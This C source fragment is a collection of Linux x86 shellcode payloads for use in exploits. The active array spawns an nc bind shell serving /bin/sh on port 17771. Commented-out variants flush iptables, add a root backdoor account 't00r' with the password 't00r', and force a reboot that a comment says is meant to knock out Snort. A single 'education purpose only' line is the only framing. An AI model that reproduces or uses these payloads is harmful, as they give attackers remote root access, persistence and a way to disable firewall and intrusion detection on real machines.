#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
# Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
# This shellcode will listen on port 17771 and give you /bin/sh
# Date: 31.05.2014
# Shellcode Author: Oleg Boytsev
# Tested on: Debian GNU/Linux 7/i686
# Shellcode Length: 58
# For education purpose only
*/
//http://shell-storm.org/shellcode/

#define SHELL_SIZE 58

//root shell on 17771 : size 58
unsigned char shellcode[] = "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";


//FLUSH IPTABLES SZIE 43
//unsigned char *shellcode = "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";

//add t00r w/ t00r : size 116
/*unsigned char shellcode[] =
"\x29\xc9\x83\xe9\xe9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfd"
"\x96\x34\xe4\x83\xeb\xfc\xe2\xf4\xcc\x5f\xbd\x2f\x97\xd0\x6c\x29"
"\x7d\xfc\x31\xbc\xcc\x5f\x65\x8c\x8e\xe5\x43\x80\x95\xb9\x1b\x94"
"\x9c\xfe\x1b\x81\x89\xf5\xbd\x07\xbc\x23\x30\x29\x7d\x05\xdc\xc6"
"\xfd\x96\x34\x90\xcd\xa6\x46\xde\xbc\xd7\x6d\xaf\xaa\xc0\x5e\xb6"
"\xb1\xa0\x5e\x8f\xb4\xac\x04\xde\xcd\xac\x0e\xcb\xc7\xb9\x56\x8d"
"\x93\xb9\x47\x8c\xf7\xcf\xbf\xb5\x01\xfc\x30\xbc\x30\x16\x5e\xe5"
"\xa5\x5b\xb4\xe4";*/


//Hard reboot size 33 (purpose will be to unload snort and everything else they have)
//unsigned char *shellcode=
//		"\xb0\x24"                    /* mov    $0x24,%al */
//		"\xcd\x80"                    /* int    $0x80 */
//		"\x31\xc0"                    /* xor    %eax,%eax */
//		"\xb0\x58"                    /* mov    $0x58,%al */
//		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
//		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
//		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
//		"\xcd\x80"                    /* int    $0x80 */
//		"\x31\xc0"                    /* xor    %eax,%eax */
//		"\xb0\x01"                    /* mov    $0x1,%al */
//		"\x31\xdb"                    /* xor    %ebx,%ebx */
//		"\xcd\x80";                   /* int    $0x80 */

